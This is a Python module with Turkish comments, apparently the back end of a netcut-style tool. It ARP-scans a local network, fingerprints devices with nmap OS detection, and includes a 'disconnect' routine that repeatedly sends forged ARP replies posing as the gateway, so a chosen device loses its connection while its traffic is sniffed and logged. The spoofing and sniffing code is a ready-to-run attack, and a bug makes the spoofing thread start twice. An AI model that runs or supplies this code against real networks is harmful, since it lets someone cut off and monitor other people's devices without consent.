import json
import os
import threading
import time
import socket
import nmap  # pip install python-nmap ile yüklediğin kütüphane
from scapy.all import ARP, Ether, srp, send, sniff, IP
from mac_vendor_lookup import MacLookup

class NetworkManager:
    def __init__(self):
        self.is_spoofing = False
        self.db_path = "known_devices.json"
        self.nm_scanner = nmap.PortScanner() # Nmap tarayıcısını başlat
        self.vendor_lookup = MacLookup()
        self.log_callback = None
        try:
            self.vendor_lookup.update_vendors() 
        except:
            pass

    def get_custom_name(self, mac):
        """JSON dosyasından ismi güvenli bir şekilde okur."""
        if not os.path.exists(self.db_path):
            return None
        
        try:
            with open(self.db_path, "r", encoding="utf-8") as f:
                content = f.read()
                if not content: # Dosya boşsa
                    return None
                db = json.loads(content)
                return db.get(mac)
        except (json.JSONDecodeError, Exception):
            return None
    
    def save_custom_name(self, mac, name):
        """İsmi kaydederken dosyayı her zaman geçerli bir JSON formatında tutar."""
        db = {}
        if os.path.exists(self.db_path):
            try:
                with open(self.db_path, "r", encoding="utf-8") as f:
                    content = f.read()
                    if content:
                        db = json.loads(content)
            except json.JSONDecodeError:
                db = {}

        db[mac] = name
        with open(self.db_path, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=4)

    def get_hostname(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except (socket.herror, socket.gaierror):
            return None

    def get_vendor(self, mac):
        try:
            return self.vendor_lookup.lookup(mac)
        except:
            return "Bilinmeyen Marka"

    def get_os_info(self, ip):
        """Nmap kullanarak cihazın işletim sistemini tahmin eder."""
        try:
            # -O: İşletim sistemi tespiti, -F: Hızlı tarama
            # Bu işlem birkaç saniye sürebilir
            scan_result = self.nm_scanner.scan(ip, arguments='-O -F --host-timeout 5s')
            if 'osmatch' in scan_result['scan'][ip] and scan_result['scan'][ip]['osmatch']:
                return scan_result['scan'][ip]['osmatch'][0]['name']
        except:
            pass
        return "İşletim Sistemi Belirlenemedi"

    def scan_network(self, ip_range):
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        result = srp(packet, timeout=3, verbose=False)[0]
        devices = []
        
        for sent, received in result:
            # 1. ADIM: Önce veriyi Scapy'den al (mac burada tanımlanıyor)
            ip = received.psrc
            mac = received.hwsrc
            
            # 2. ADIM: Şimdi mac değişkenini kullanabiliriz
            custom_name = self.get_custom_name(mac)
            
            if custom_name:
                name = custom_name
            else:
                # 3. ADIM: Eğer özel isim yoksa diğer sorguları yap
                name = self.get_hostname(ip)
                if not name or name == ip:
                    os_guess = self.get_os_info(ip)
                    if os_guess and "Belirlenemedi" not in os_guess:
                        name = f"OS: {os_guess}"
                    else:
                        name = f"Marka: {self.get_vendor(mac)}"
            
            devices.append({'ip': ip, 'mac': mac, 'name': name})
        
        return devices
    
    def packet_callback(self, packet):
        """Hedef cihazdan gelen her paketi yakalar ve GUI'ye bildirir."""
        if self.is_spoofing and self.log_callback:
            # Eğer paket gelen IP, hedef IP ile eşleşiyorsa
            if packet.haslayer(IP) and packet[IP].src == self.target_ip:
                self.log_callback(f"⚠️ Engellenen Cihaz ({self.target_ip}) veri göndermeye çalışıyor!")

    def start_sniffing(self):
        """Ayrı bir thread'de paket dinlemeyi başlatır."""
        # Sadece hedef IP'den gelen paketleri filtrele (Performans için)
        sniff(filter=f"host {self.target_ip}", prn=self.packet_callback, stop_filter=lambda x: not self.is_spoofing)

    def spoof(self, target_ip, gateway_ip, target_mac):
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        while self.is_spoofing:
            send(packet, verbose=False)
            time.sleep(5)

    def start_disconnect(self, target_ip, gateway_ip, target_mac, log_cb):
        self.target_ip = target_ip
        self.is_spoofing = True
        self.log_callback = log_cb
        self.thread = threading.Thread(target=self.spoof, args=(target_ip, gateway_ip, target_mac), daemon=True)
        self.thread.start()

        # ARP Spoofing Thread
        threading.Thread(target=self.spoof, args=(target_ip, gateway_ip, target_mac), daemon=True).start()
        # Paket Dinleme Thread (Canlı Log için)
        threading.Thread(target=self.start_sniffing, daemon=True).start()

    def restore(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """Ağı eski haline döndürür (Düzeltme paketleri gönderir)."""
        # op=2, psrc=kaynak ip, hwsrc=kaynak mac, pdst=hedef ip, hwdst=hedef mac
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        send(packet, count=4, verbose=False)
        
        packet_rev = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
        send(packet_rev, count=4, verbose=False)


    def stop_disconnect(self):
        self.is_spoofing = False